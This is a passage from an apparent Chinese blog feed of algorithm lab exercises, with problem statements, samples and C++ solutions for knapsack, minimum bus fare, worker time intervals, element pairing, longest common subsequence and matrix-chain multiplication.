i=<span class="number">1</span>;i&lt;=z;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=h;j&gt;=a[i];j--)</span><br><span class="line">            dp[j]=max(dp[j],dp[j-a[i]]+a[i]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[h]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-汽车费用"><a href="#问题-C-汽车费用" class="headerlink" title="问题 C: 汽车费用"></a>问题 C: 汽车费用</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>仅一个整数表示最少费用。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12 21 31 40 49 58 69 79 90 101</span><br><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">11</span>],v[<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">105</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v[i]=inf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">10</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;=j)</span><br><span class="line">            &#123;</span><br><span class="line">                v[i]=min(v[i],v[i-j]+a[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;v[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-法师康的工人"><a href="#问题-D-法师康的工人" class="headerlink" title="问题 D: 法师康的工人"></a>问题 D: 法师康的工人</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。</p><p>你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。</p><p>·最长的至少有一个工人在工作的时间段</p><p>·最长的无人工作的时间段（从有人工作开始计）</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>输出为一行，用空格分隔开两个我们所求的数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">200 1000</span><br><span class="line">700 1100</span><br><span class="line">1500 2100</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">900 400</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">5005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> b,e;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> node&amp; c) <span class="keyword">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> b &lt; c.b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,ans1,ans2;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i].b&gt;&gt;a[i].e;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+n);</span><br><span class="line">    ans1 = a[<span class="number">0</span>].e - a[<span class="number">0</span>].b;</span><br><span class="line">    ans2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i].b &lt;= a[j].e)    <span class="comment">//如果交叉或相切</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[j].e = max(a[i].e,a[j].e);</span><br><span class="line">            ans1 = max(ans1,a[j].e-a[j].b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans2 = max(ans2,a[i].b-a[j].e);</span><br><span class="line">            j = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans1&lt;&lt;<span class="string">" "</span>&lt;&lt;ans2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-配对元素"><a href="#问题-E-配对元素" class="headerlink" title="问题 E: 配对元素"></a><strong>问题 E: 配对元素</strong></h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>一个数，最大配对</p><p>3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤1000。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2 5 6 3</span><br><span class="line">1 4 6 7</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> a[n],b[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i]&gt;&gt;b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+n);</span><br><span class="line">    sort(b,b+n);</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum+<span class="built_in">abs</span>(a[i]-b[n<span class="number">-1</span>-i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验（二）</title>
      <link href="/2019/10/23/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C2/"/>
      <url>/2019/10/23/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C2/</url>
      
        <content type="html"><![CDATA[<p>算法实验二。</p><a id="more"></a><h2 id="问题-A-最长公共子序列"><a href="#问题-A-最长公共子序列" class="headerlink" title="问题 A: 最长公共子序列"></a>问题 A: 最长公共子序列</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*void LCSlength(int m,int n,char *x,char *y,int  c[105][105],int b[105][105])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int i,j;</span></span><br><span class="line"><span class="comment">    for(i=1;i&lt;=m;i++)</span></span><br><span class="line"><span class="comment">        c[i][0]=0;</span></span><br><span class="line"><span class="comment">    for(i=1;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">        c[0][i]=0;</span></span><br><span class="line"><span class="comment">    for(i=1;i&lt;=m;i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        for(j=1;j&lt;=n;j++)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            if(x[i]==y[i])</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                c[i][j]=c[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">                b[i][j]=1;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else if(c[i-1][j]&gt;=c[i][j-1])</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                c[i][j]=c[i-1][j];</span></span><br><span class="line"><span class="comment">                b[i][j]=2;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            else</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                c[i][j]=c[i][j-1];</span></span><br><span class="line"><span class="comment">                b[i][j]=3;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> x[<span class="number">105</span>],y[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">int</span> c[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;y+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> m=<span class="built_in">strlen</span>(x+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> n=<span class="built_in">strlen</span>(y+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            c[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">            c[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*for(int i=0;i&lt;=105;i++)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            for(int j=0;j&lt;=105;j++)</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                c[i][j]=0;</span></span><br><span class="line"><span class="comment">                b[i][j]=0;</span></span><br><span class="line"><span class="comment">             &#125;</span></span><br><span class="line"><span class="comment">         &#125;*/</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(x[i]==y[j])</span><br><span class="line">                    c[i][j]=c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    c[i][j]=max(c[i<span class="number">-1</span>][j],c[i][j<span class="number">-1</span>]);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//cout&lt;&lt;x+1&lt;&lt;y+1&lt;&lt;endl;</span></span><br><span class="line">        <span class="comment">//cout&lt;&lt;m&lt;&lt;n&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;c[m][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-矩阵连乘"><a href="#问题-B-矩阵连乘" class="headerlink" title="问题 B: 矩阵连乘"></a>问题 B: 矩阵连乘</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p><p>数据保证结果不超过1e9。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>][<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxchain</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        m[i][i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">2</span>;r&lt;=n;r++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n-r+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j=i+r<span class="number">-1</span>;</span><br><span class="line">            m[i][j]=m[i+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[i]*p[j];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=i+<span class="number">1</span>;k&lt;j;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> t=m[i][k]+m[k+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[k]*p[j];</span><br><span class="line">                <span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">                &#123;</span><br><span class="line">                    m[i][j]=t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> m[<span class="number">1</span>][n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)</span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="keyword">char</span> chain[<span class="number">30</span>];</span><br><span class="line">        <span class="keyword">int</span> h[<span class="number">30</span>];</span><br><span class="line">        <span class="keyword">int</span> l[<span class="number">30</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span 